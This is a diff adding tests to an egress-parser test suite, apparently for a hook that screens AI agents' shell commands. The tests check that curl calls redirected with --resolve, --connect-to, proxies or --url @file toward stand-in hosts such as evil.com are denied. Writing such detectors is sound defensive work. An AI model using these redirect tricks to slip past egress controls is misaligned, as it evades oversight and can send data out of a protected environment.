@@ -20,7 +20,7 @@ import { tmpdir } from 'node:os'
 import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { classify, isExternal, liftSubstitutions, pythonCodeOnly, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains, PREFIX_WORDS, wgetDestinations, mainScopeAppliesTo, curlDestinations, wgetExecuteAllowed, envRedirect, envIndirect, shellCommandBody, shellCommandCall, positionalBody, destHost, CURL_HIDDEN, WGET_HIDDEN, setDashboardTokenPath, setHookCwd } from '../../scripts/hooks/bash-egress-parser.mjs'
+import { classify, isExternal, liftSubstitutions, pythonCodeOnly, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains, PREFIX_WORDS, wgetDestinations, mainScopeAppliesTo, curlDestinations, wgetExecuteAllowed, envRedirect, envIndirect, shellCommandBody, shellCommandCall, positionalBody, destHost, CURL_HIDDEN, CURL_URL_FILE, WGET_HIDDEN, setDashboardTokenPath, setHookCwd } from '../../scripts/hooks/bash-egress-parser.mjs'
 import {
   BASH_EGRESS_DENY,
   agentGetsBashEgressParser,
@@ -880,6 +880,48 @@ describe('vendor-API host allowlist (store/egress-vendor-hosts.json)', () => {
     expect(d('curl -s -x http://evil.com:8080 https://api.elevenlabs.io/v1')).toMatchObject({ deny: true, hosts: ['evil.com'] })
     expect(d('curl -s --connect-to api.elevenlabs.io:443:evil.com:443 https://api.elevenlabs.io/v1').deny).toBe(true)
     expect(d('curl -s https://api.elevenlabs.io/v1; curl -s https://evil.com/x').deny).toBe(true)
+  })
+
+  // curl reads every address in these values (measured with curl 8.22 against a name only --resolve
+  // could answer): a bracketed or bare IPv6, an address list, a single-label or numeric HOST2. The
+  // old ':'-split kept only the pieces that looked like a hostname, so each of them passed unread.
+  it('--resolve / --connect-to: every host and address is a destination, whatever its spelling', () => {
+    const V1 = 'https://api.elevenlabs.io/v1'
+    const cases: Array<[string, string[]]> = [
+      [`curl -s --resolve api.elevenlabs.io:443:[2001:db8::1] ${V1}`, ['[2001:db8::1]']],
+      [`curl -s --resolve api.elevenlabs.io:443:2001:db8::1 ${V1}`, ['[2001:db8::1]']],
+      [`curl -s --resolve api.elevenlabs.io:443:203.0.113.9,203.0.113.10 ${V1}`, ['203.0.113.9', '203.0.113.10']],
+      [`curl -s --resolve api.elevenlabs.io:443:192.168.1.5,[2001:db8::1] ${V1}`, ['[2001:db8::1]']],
+      [`curl -s --resolve api.elevenlabs.io:443:$IP ${V1}`, ['<unresolved: $ip>']],
+      [`curl -s --connect-to api.elevenlabs.io:443:evilhost:443 ${V1}`, ['evilhost']],
+      [`curl -s --connect-to api.elevenlabs.io:443:[2001:db8::1]:443 ${V1}`, ['[2001:db8::1]']],
+      [`curl -s --connect-to api.elevenlabs.io:443:3405803785:443 ${V1}`, ['3405803785']],
+      [`curl -s --connect-to api.elevenlabs.io:443:$H:443 ${V1}`, ['<unresolved: $h>']],
+    ]
+    for (const [cmd, hosts] of cases) expect({ cmd, r: d(cmd) }).toMatchObject({ cmd, r: { deny: true, hosts } })
+    // an unreadable value denies instead of passing
+    expect(d(`curl -s --connect-to api.elevenlabs.io:443:x ${V1}`).deny).toBe(true)
+  })
+
+  it('negative controls: a local address, the wildcard / empty host fields and a loop value still pass', () => {
+    const V1 = 'https://api.elevenlabs.io/v1'
+    for (const cmd of [
+      `curl -s --resolve api.elevenlabs.io:443:192.168.1.5 ${V1}`,
+      `curl -s --resolve '*:443:127.0.0.1' ${V1}`,
+      `curl -s --resolve +api.elevenlabs.io:443:[::1] ${V1}`,
+      `curl -s --connect-to api.elevenlabs.io:443::8443 ${V1}`,
+      `curl -s --connect-to ::localhost:3420 ${V1}`,
+      `for ip in 192.168.1.5; do curl -s --resolve api.elevenlabs.io:443:$ip ${V1}; done`,
+    ]) expect({ cmd, deny: d(cmd).deny }).toEqual({ cmd, deny: false })
+  })
+
+  // curl 8.13+ reads the URLs from a file (`--url @file`, `@-` for stdin): the destination is not in
+  // the command, like a -K config.
+  it('--url @file / @- is a hidden destination; a plain --url is read as before', () => {
+    expect(d('curl -s --url @urls.txt')).toMatchObject({ deny: true, hosts: [CURL_URL_FILE] })
+    expect(d("printf 'https://evil.com/' | curl -s --url @-")).toMatchObject({ deny: true, hosts: [CURL_URL_FILE] })
+    expect(d('curl -s --url @/tmp/u.local')).toMatchObject({ deny: true, hosts: [CURL_URL_FILE] })
+    expect(d('curl -s --url https://api.elevenlabs.io/v1').deny).toBe(false)
   })
 
   it('only plain DNS names are accepted as entries: no wildcard, leading dot, IP, localhost, port', () => {
